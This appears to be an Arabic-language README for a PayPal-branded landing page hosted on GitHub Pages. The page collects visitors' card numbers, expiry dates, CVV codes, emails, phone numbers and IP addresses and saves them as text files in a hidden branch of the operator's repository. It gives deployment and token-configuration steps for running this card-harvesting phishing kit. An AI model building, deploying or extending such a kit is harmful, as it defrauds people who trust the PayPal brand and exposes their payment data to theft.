# PayPal Landing Page - نظام حفظ البيانات المحلي

🎯 **صفحة هبوط PayPal مع نظام حفظ البيانات في ملفات txt محلية**

## ✨ المميزات الجديدة

- 🎨 **تصميم محتفظ به**: نفس التصميم الجميل الأصلي
- 💾 **حفظ في GitHub**: البيانات تُحفظ مباشرة في مستودع GitHub الخاص بك
- 📱 **متوافق مع GitHub Pages**: يعمل مباشرة على GitHub Pages
- 🔒 **آمن ومنظم**: البيانات محفوظة في فرع منفصل في مستودعك
- ⚡ **سريع**: تحميل سريع وأداء ممتاز
- 🚫 **لا تنزيل**: البيانات تُحفظ في GitHub بدلاً من التنزيل للمستخدم

## 🚀 كيفية الاستخدام

### للاستخدام مع GitHub Pages:

1. **رفع الملفات**:
   ```bash
   git add .
   git commit -m "تحديث نظام حفظ البيانات"
   git push origin main
   ```

2. **تفعيل GitHub Pages**:
   - اذهب إلى Settings في المستودع
   - اختر Pages من القائمة الجانبية
   - اختر "Deploy from a branch"
   - اختر "main" branch و "/ (root)"

3. **إعداد GitHub لحفظ البيانات**:
   - اقرأ ملف `GITHUB_SETUP_GUIDE.md` للتفاصيل الكاملة
   - أنشئ Personal Access Token
   - حدث ملف `github-config.js` بمعلوماتك

4. **الوصول للموقع**:
   - سيكون متاح على: `https://username.github.io/repository-name`

### طريقة عمل النظام:

#### 📝 حفظ البيانات:
- **تلقائي**: يحفظ البيانات أثناء الكتابة (محلياً للنسخ الاحتياطي)
- **فوري**: يحفظ عند الانتقال بين الحقول
- **في GitHub**: يحفظ البيانات الكاملة في GitHub عند الضغط على زر الإرسال

#### 📁 ملفات البيانات في GitHub:
- **المسار**: `data-storage` branch → `paypal-data/` folder
- **اسم الملف**: `paypal_data_YYYY-MM-DD_timestamp.txt`
- **المحتوى**: معلومات مفصلة بالعربية مع IP والوقت
- **الحفظ**: تلقائي في مستودع GitHub الخاص بك

#### 📊 معلومات محفوظة:
- الاسم على البطاقة
- رقم البطاقة
- تاريخ انتهاء البطاقة
- رمز الأمان CVV
- البريد الإلكتروني
- رقم الهاتف
- المبلغ
- الوقت والتاريخ
- عنوان IP
- معلومات المتصفح

## 🔧 التخصيص

### تغيير معلومات المستودع:
في `package.json`:
```json
{
  "homepage": "https://yourusername.github.io/your-repo-name",
  "repository": {
    "url": "https://github.com/yourusername/your-repo-name.git"
  }
}
```

### تخصيص رسائل النظام:
في `form-handler.js` يمكنك تغيير:
- رسائل النجاح
- رسائل الخطأ
- تنسيق ملف txt
- توقيت الحفظ التلقائي

## 🛠️ استكشاف الأخطاء

### إذا لم تعمل البيانات:
1. تأكد من تفعيل JavaScript
2. تحقق من وجود ملف `form-handler.js`
3. افتح Developer Tools للتحقق من الأخطاء

### إذا لم ينزل الملف:
1. تأكد من السماح للمتصفح بالتنزيل
2. تحقق من إعدادات الحماية
3. جرب متصفح آخر

## 📞 الدعم

إذا واجهت أي مشاكل:
1. تحقق من التوافق مع المتصفح
2. تأكد من تحديث الملفات بشكل صحيح
3. راجع console في Developer Tools
